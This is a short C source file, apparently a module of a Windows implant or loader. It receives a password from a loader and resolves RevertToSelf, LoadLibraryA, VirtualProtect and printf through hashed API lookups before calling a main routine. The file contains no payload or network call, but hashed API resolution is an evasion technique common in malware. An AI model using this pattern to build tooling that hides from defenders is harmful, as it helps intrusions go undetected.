#include <windows.h>
#include "../src_common/common.h"
#include "main.h"


int Execute(LPCWSTR PasswdFromLoader){
	API Api;

	Api._RevertToSelf = getFunctionPtr(H_LIB_ADVAPI32, H_API_REVERTTOSELF);
	Api._LoadLibraryA = getFunctionPtr(H_LIB_KERNEL32, H_API_LOADLIBRARYA);
	Api._VirtualProtect = getFunctionPtr(H_LIB_KERNEL32, H_API_VIRTUALPROTECT);
	Api._printf = getFunctionPtr(H_LIB_MSVCRT, H_API_PRINTF);
	Mmain(Api, PasswdFromLoader);
	return 0;
}
